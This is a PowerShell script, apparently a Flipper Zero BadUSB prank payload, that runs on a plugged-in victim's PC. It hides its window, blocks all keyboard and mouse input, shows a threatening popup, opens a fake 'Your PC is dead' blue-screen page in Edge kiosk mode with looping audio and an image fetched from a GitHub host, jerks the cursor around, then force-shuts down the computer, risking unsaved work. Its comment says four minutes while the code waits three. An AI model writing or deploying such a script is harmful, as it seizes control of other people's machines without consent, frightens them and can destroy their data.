Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
  [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
  [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
  [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

# Hide the PowerShell window
$hWnd = [Win32]::GetForegroundWindow()
[Win32]::ShowWindow($hWnd, 0)

# Lock input
[Win32]::BlockInput($true)

# Creepy popup
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show("You shouldn''t have plugged that in... I''m watching.","System Alert")

# BSOD HTML with JavaScript audio autoplay hack
$html = @"
<html>
<body style='background: url(https://raw.githubusercontent.com/andythecookie13bruce/flipper-script/main/creepy.jpg) no-repeat center center fixed; background-size: cover; color:#00ff00; font-family:Consolas; font-size:24px; margin:0; overflow:hidden;'>
<center style='margin-top: 10%;'>
<h1>😵</h1>
<h2>Your PC is dead.</h2>
<p>It saw something it shouldn’t have.</p>
<p>There is no reboot.</p>
<p>We warned you.</p>
</center>
<script>
  let audio = new Audio("https://raw.githubusercontent.com/andythecookie13bruce/flipper-script/main/whispers.mp3");
  audio.loop = true;
  audio.volume = 1.0;
  setTimeout(() => {{
    audio.play().catch(e => console.log("Autoplay blocked"));
  }}, 500); // Give browser a sec before attempting playback

  let glitch = () => {{
    document.body.style.opacity = Math.random();
    document.body.style.transform = "scale(" + (1 + Math.random()/10) + ")";
    setTimeout(glitch, 100);
  }};
  glitch();
</script>
</body>
</html>
"@

# Save and open BSOD
$bsodFile = "$env:TEMP\bsod.html"
$html | Out-File $bsodFile -Encoding ASCII
Start-Process "msedge.exe" -ArgumentList "--kiosk", $bsodFile

# Glitch mouse cursor (shake)
Start-Job {
  Add-Type -AssemblyName System.Windows.Forms
  for ($i = 0; $i -lt 100; $i++) {
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1920), (Get-Random -Minimum 0 -Maximum 1080))
    Start-Sleep -Milliseconds 200
  }
}

# ⏳ Wait 4 minutes before shutdown
Start-Sleep -Seconds 180
[Win32]::BlockInput($false)
Stop-Computer -Force
